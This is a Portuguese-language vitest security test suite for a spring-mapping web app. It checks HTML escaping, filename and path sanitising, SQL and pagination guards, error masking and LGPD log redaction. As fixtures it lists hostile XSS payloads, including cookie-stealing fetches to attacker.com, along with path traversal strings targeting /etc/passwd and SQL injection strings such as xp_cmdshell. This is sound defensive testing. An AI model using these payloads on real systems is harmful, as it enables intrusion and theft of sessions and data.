import { describe, expect, it } from 'vitest';
import { z } from 'zod';
import { Prisma } from '@prisma/client';
import {
  buildSafeNascenteFilters,
  escapeHtml,
  generateSafeBlobPathname,
  sanitizeFilename,
  sanitizeMapText,
  sanitizeSearchTerm,
  stripHtml,
  validatePaginationParams,
  validateUploadFilename,
} from '@/lib/security/sanitizer';
import { AppError, formatPublicError, handleApiError } from '@/lib/errors';
import { anonymizeIp, logger, maskEmail, sanitizePath } from '@/lib/logger';

describe('Suíte de Testes de Entrada Hostil, Segurança de API e LGPD', () => {
  describe('1. Injeção de Código e Ataques Hostis Multi-Vetor (XSS, Path Traversal, SQLi)', () => {
    describe('Neutralização de Vetores Complexos de XSS', () => {
      const hostileXssPayloads: readonly string[] = [
        '<svg/onload=alert("xss_svg")>',
        '<iframe src="javascript:alert(\'xss_iframe\')"></iframe>',
        '<body onload=alert(document.cookie)>',
        '"><script>fetch("http://attacker.com/steal?c="+document.cookie)</script>',
        '<img src=x onerror=this.src="http://attacker.com/"+document.domain>',
        'javascript:/*--></title></style></textarea>*/<script>alert(1)</script>',
        '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
        '<input type="text" autofocus onfocus="alert(1)">',
        '"><a href="javascript:void(0)" onclick="alert(1)">Clique aqui</a>',
      ];

      it('deve neutralizar todos os vetores complexos de XSS convertendo tags e delimitadores em entidades HTML', () => {
        for (const payload of hostileXssPayloads) {
          const escaped = escapeHtml(payload);

          // Garante que nenhum delimitador permanece desescapado para execução pelo navegador
          expect(escaped).not.toContain('<');
          expect(escaped).not.toContain('>');
          expect(escaped).not.toContain('"');
          expect(escaped).not.toContain("'");
          expect(escaped).not.toContain('`');
          expect(escaped).not.toContain('<script');
          expect(escaped).not.toContain('<svg');
          expect(escaped).not.toContain('<iframe');
          expect(escaped).not.toContain('<img');
          expect(escaped).not.toContain('<body');
        }
      });

      it('deve remover completamente tags executáveis em sanitização de texto plano (stripHtml)', () => {
        for (const payload of hostileXssPayloads) {
          const stripped = stripHtml(payload);

          // Garante que nenhuma tag executável sobrevive à remoção
          expect(stripped).not.toContain('<script');
          expect(stripped).not.toContain('</script>');
          expect(stripped).not.toContain('<svg');
          expect(stripped).not.toContain('<iframe');
          expect(stripped).not.toContain('<img');
          expect(stripped).not.toContain('<body');
          expect(stripped).not.toContain('<math');
        }
      });

      it('deve garantir que o texto de popup do Leaflet (sanitizeMapText) é seguro contra scripts e quebras de DOM', () => {
        const maliciousMapInput =
          '  <script>eval(atob("YWxlcnQoMSk="))</script>  Nascente da Grota Seca <img src=x onerror=alert(1)>  ';
        const safeText = sanitizeMapText(maliciousMapInput);

        expect(safeText).not.toContain('<script>');
        expect(safeText).not.toContain('<img');
        expect(safeText).toContain('&lt;script&gt;');
        expect(safeText).toContain('&lt;img');
        expect(safeText).toBe(
          '&lt;script&gt;eval(atob(&quot;YWxlcnQoMSk=&quot;))&lt;&#x2F;script&gt; Nascente da Grota Seca &lt;img src=x onerror=alert(1)&gt;'
        );
      });
    });

    describe('Neutralização de Path Traversal e Injeção de Arquivos Maliciosos', () => {
      const hostileFilePaths: readonly string[] = [
        '../../../../etc/passwd',
        '..\\..\\..\\..\\Windows\\System32\\cmd.exe',
        '....//....//....//etc/shadow',
        '....\\/....\\/....\\/boot.ini',
        '..%2f..%2f..%2fetc%2fpasswd',
        '%2e%2e%2f%2e%2e%2fconfig.json',
        '/var/www/html/exploit.php',
        'C:\\inetpub\\wwwroot\\web.config',
        '\\\\attacker-share\\loot\\trojan.exe',
        'arquivo\u0000.txt.php',
        'CON.txt',
        'AUX.TXT',
        'NUL',
        'PRN.txt',
        'COM1.txt',
        'LPT1.txt',
      ];

      it('validateUploadFilename deve rejeitar sistematicamente tentativas de traversal e arquivos maliciosos', () => {
        for (const hostilePath of hostileFilePaths) {
          const validation = validateUploadFilename(hostilePath);
          expect(validation.isValid).toBe(false);
          expect(validation.reason).toBeDefined();
          expect(typeof validation.reason).toBe('string');
        }
      });

      it('sanitizeFilename deve forçar nome base seguro e extensão .txt sem permitir escape de diretório', () => {
        for (const hostilePath of hostileFilePaths) {
          const sanitized = sanitizeFilename(hostilePath);

          expect(sanitized).not.toContain('..');
          expect(sanitized).not.toContain('/');
          expect(sanitized).not.toContain('\\');
          expect(sanitized).not.toContain('\u0000');
          expect(sanitized.endsWith('.txt')).toBe(true);
        }
      });

      it('generateSafeBlobPathname deve gerar chaves blindadas para armazenamento em nuvem (Vercel Blob)', () => {
        const traversalAttempt = '../../../../etc/passwd';
        const blobKey = generateSafeBlobPathname(traversalAttempt, 'importacoes');

        expect(blobKey.startsWith('importacoes/')).toBe(true);
        expect(blobKey).not.toContain('..');
        expect(blobKey).not.toContain('etc');
        expect(blobKey.endsWith('-passwd.txt')).toBe(true);
      });
    });

    describe('Mitigação de SQL Injection em Filtros e Paginação', () => {
      const hostileSqlPayloads: readonly string[] = [
        "' OR '1'='1",
        "1; DROP TABLE nascentes; --",
        "' UNION SELECT id, password_hash, email FROM usuarios --",
        "admin' /*",
        "' OR 'x'='x' /*!50000 AND 1=1 */ --",
        "'; EXEC xp_cmdshell('dir'); --",
        "' OR 1=1 ORDER BY 10--",
        "' AND SLEEP(10) --",
        "' WAITFOR DELAY '0:0:10' --",
        '1" OR "1"="1',
      ];

      it('sanitizeSearchTerm deve limpar caracteres de controle e manter o termo seguro como literal estrito', () => {
        for (const payload of hostileSqlPayloads) {
          const sanitized = sanitizeSearchTerm(payload);

          expect(typeof sanitized).toBe('string');
          expect(sanitized).not.toContain('\u0000');
          expect(sanitized).not.toContain('\u001F');
          expect(sanitized).toBe(payload.trim());
        }
      });

      it('validatePaginationParams deve restringir páginas abusivas e impor teto de 100 itens (Anti-DoS)', () => {
        const extremePaginationAttempts = [
          { page: -100, pageSize: -50 },
          { page: 0, pageSize: 0 },
          { page: 9999999, pageSize: 1000000 },
          { page: 'NaN', pageSize: 'Infinity' },
          { page: "1' UNION SELECT 1", pageSize: '1000' },
        ];

        for (const attempt of extremePaginationAttempts) {
          const result = validatePaginationParams(attempt);

          expect(result.page).toBeGreaterThanOrEqual(1);
          expect(result.pageSize).toBeGreaterThanOrEqual(1);
          expect(result.pageSize).toBeLessThanOrEqual(100);
          expect(result.skip).toBeGreaterThanOrEqual(0);
          expect(result.take).toBeLessThanOrEqual(100);
        }
      });

      it('buildSafeNascenteFilters deve ignorar propriedades maliciosas e poluição de protótipo', () => {
        const pollutedInput = JSON.parse(
          '{"__proto__":{"polluted":true},"municipio":"Crato","fonte":"<script>","invalidKey":"malicious"}'
        ) as Record<string, unknown>;

        const safeFilters = buildSafeNascenteFilters(pollutedInput);

        expect(safeFilters.municipio).toBe('Crato');
        expect(safeFilters.fonte).toBe('<script>');
        expect((safeFilters as Record<string, unknown>).invalidKey).toBeUndefined();
        expect(({} as Record<string, unknown>).polluted).toBeUndefined();
      });
    });

    describe('Resiliência a Carga Extrema e Entradas Malformadas (DoS / ReDoS)', () => {
      it('deve processar strings gigantes (>100.000 caracteres) sem estourar memória nem travar a CPU', () => {
        const massiveString = 'A'.repeat(120000);
        const startTime = Date.now();

        const escaped = escapeHtml(massiveString);
        const stripped = stripHtml(massiveString);
        const sanitizedSearch = sanitizeSearchTerm(massiveString, 100);

        const duration = Date.now() - startTime;

        expect(escaped.length).toBe(120000);
        expect(stripped.length).toBe(120000);
        expect(sanitizedSearch.length).toBe(100);
        expect(duration).toBeLessThan(1000); // Execução deve ser concluída em menos de 1s
      });
    });
  });

  describe('2. Fronteira de Erro da API (Proteção contra Exposição de Dados e Stack Traces)', () => {
    it('deve ocultar credenciais de conexão do MySQL e portas internas em erros 500', async () => {
      const dbConnectionLeakError = new Error(
        'Connection failed to mysql://app_user:SuperSecretPassword99@10.0.0.15:3306/nascentes_prod'
      );
      dbConnectionLeakError.stack =
        'Error: Connection failed\n    at Connection.connect (C:\\Users\\admin\\app\\db.ts:45:10)';

      const response = handleApiError(dbConnectionLeakError);

      expect(response.status).toBe(500);
      expect(response.headers.get('Cache-Control')).toBe('no-store');

      const body = (await response.json()) as { code: string; error: string; stack?: string };

      expect(body.code).toBe('INTERNAL_SERVER_ERROR');
      expect(body.error).toBe('Ocorreu um erro interno ao processar a solicitação.');
      expect(body.stack).toBeUndefined();

      const rawJson = JSON.stringify(body);
      expect(rawJson).not.toContain('SuperSecretPassword99');
      expect(rawJson).not.toContain('mysql://');
      expect(rawJson).not.toContain('10.0.0.15');
      expect(rawJson).not.toContain('3306');
      expect(rawJson).not.toContain('C:\\Users');
    });

    it('deve ocultar caminhos de arquivos Linux (/var/www, /home) em mensagens de erro públicas', async () => {
      const linuxPathError = new Error(
        'ENOENT: no such file or directory, open "/var/www/nascentes/secrets/master.key"'
      );

      const { body, statusCode } = formatPublicError(linuxPathError);

      expect(statusCode).toBe(500);
      expect(body.code).toBe('INTERNAL_SERVER_ERROR');
      expect(body.error).toBe('Ocorreu um erro interno ao processar a solicitação.');

      const serialized = JSON.stringify(body);
      expect(serialized).not.toContain('/var/www');
      expect(serialized).not.toContain('master.key');
    });

    it('deve sanitizar erros Prisma P2002 sem expor nomes de colunas confidenciais', () => {
      const duplicateError = new Prisma.PrismaClientKnownRequestError(
        'Unique constraint failed on the fields: (`password_hash`, `email`)',
        {
          code: 'P2002',
          clientVersion: '7.10.0',
        }
      );

      const result = formatPublicError(duplicateError);

      expect(result.statusCode).toBe(409);
      expect(result.body.code).toBe('DUPLICATE_ENTRY');
      expect(result.body.error).toBe('Conflito: já existe um registro com os dados informados.');

      const json = JSON.stringify(result.body);
      expect(json).not.toContain('password_hash');
      expect(json).not.toContain('Unique constraint failed');
    });

    it('deve formatar falhas de validação Zod sem refletir segredos em texto puro', () => {
      const userSchema = z.object({
        senha: z.string().min(8, 'Senha deve ter no mínimo 8 caracteres'),
        cpf: z.string().regex(/^\d{11}$/, 'CPF inválido'),
      });

      const parsed = userSchema.safeParse({
        senha: '123',
        cpf: 'abc',
      });

      expect(parsed.success).toBe(false);
      if (!parsed.success) {
        const result = formatPublicError(parsed.error);

        expect(result.statusCode).toBe(400);
        expect(result.body.code).toBe('VALIDATION_ERROR');

        const details = result.body.details as readonly { campo: string; mensagem: string }[];
        expect(details).toHaveLength(2);
        expect(details.some((d) => d.campo === 'senha')).toBe(true);
        expect(details.some((d) => d.campo === 'cpf')).toBe(true);

        // Garante que o valor incorreto da senha ('123') NÃO é ecoado de volta no payload de erro
        const json = JSON.stringify(result.body);
        expect(json).not.toContain('"123"');
      }
    });

    it('AppError operacional deve manter integridade e código sem vazar dados de ambiente', () => {
      const operational = new AppError('Não autorizado para este recurso', 403, 'FORBIDDEN');
      const result = formatPublicError(operational);

      expect(result.statusCode).toBe(403);
      expect(result.body.code).toBe('FORBIDDEN');
      expect(result.body.error).toBe('Não autorizado para este recurso');
    });
  });

  describe('3. Conformidade LGPD, Minimização de Dados e Sanitização de Logs', () => {
    it('deve mascarar PII (CPF, RG, telefones, cartões) quando presentes em payloads de requisições registradas no log', () => {
      const logEntry = logger.warn('Tentativa de registro suspeita com dados pessoais', {
        cpf: '012.345.678-99',
        rg: '12.345.678-0',
        telefone: '(88) 98765-4321',
        cartao: '4532-1111-2222-3333',
        documento: '98765432100',
        nomeUsuario: 'Pesquisador Visitante',
      });

      expect(logEntry.context).toBeDefined();
      expect(logEntry.context?.cpf).toBe('[REDACTED]');
      expect(logEntry.context?.rg).toBe('[REDACTED]');
      expect(logEntry.context?.telefone).toBe('[REDACTED]');
      expect(logEntry.context?.cartao).toBe('[REDACTED]');
      expect(logEntry.context?.documento).toBe('[REDACTED]');
      expect(logEntry.context?.nomeUsuario).toBe('Pesquisador Visitante');
    });

    it('deve mascarar e-mails institucionais e pessoais preservando apenas domínio e prefixo mínimo', () => {
      expect(maskEmail('pesquisador@ufca.edu.br')).toBe('pe***@ufca.edu.br');
      expect(maskEmail('admin@cariri.org')).toBe('ad***@cariri.org');
      expect(maskEmail('a@b.com')).toBe('*@b.com');
      expect(maskEmail('invalido')).toBe('[REDACTED_EMAIL]');
      expect(maskEmail('')).toBe('');
    });

    it('deve anonimizar endereços IPv4 zerando o último octeto conforme princípio de minimização', () => {
      expect(anonymizeIp('177.135.200.42')).toBe('177.135.200.0');
      expect(anonymizeIp('192.168.1.150')).toBe('192.168.1.0');
      expect(anonymizeIp('10.0.0.1')).toBe('10.0.0.0');
      expect(anonymizeIp('invalido')).toBe('[ANONYMIZED_IP]');
      expect(anonymizeIp('')).toBe('');
    });

    it('deve anonimizar endereços IPv6 preservando apenas o prefixo de rede (/48)', () => {
      expect(anonymizeIp('2804:14d:5c73:8090:1234:5678:9abc:def0')).toBe('2804:14d:5c73::');
      expect(anonymizeIp('2001:db8:85a3:8d3:1319:8a2e:370:7348')).toBe('2001:db8:85a3::');
    });

    it('deve sanitizar caminhos absolutos do sistema operacional em mensagens e exceções do logger', () => {
      const windowsPath = 'Erro ao ler arquivo C:\\Users\\bruno\\Documents\\secret.env';
      const unixPath = 'Falha no processo em /home/ubuntu/app/config/production.json';

      expect(sanitizePath(windowsPath)).toBe('Erro ao ler arquivo [PATH]');
      expect(sanitizePath(unixPath)).toBe('Falha no processo em [PATH]');
    });

    it('deve tratar estruturas profundamente aninhadas com referências circulares sem quebrar o logger', () => {
      interface SelfReferencingNode {
        nome: string;
        token: string;
        autoReferencia?: SelfReferencingNode;
      }

      const circularNode: SelfReferencingNode = {
        nome: 'Nó Raiz',
        token: 'super_secret_token_123',
      };
      circularNode.autoReferencia = circularNode;

      const logEntry = logger.error('Falha em estrutura complexa', undefined, {
        dados: circularNode,
      });

      const dados = logEntry.context?.dados as SelfReferencingNode;
      expect(dados.nome).toBe('Nó Raiz');
      expect(dados.token).toBe('[REDACTED]');
      expect(dados.autoReferencia).toBe('[CIRCULAR]');
    });
  });
});
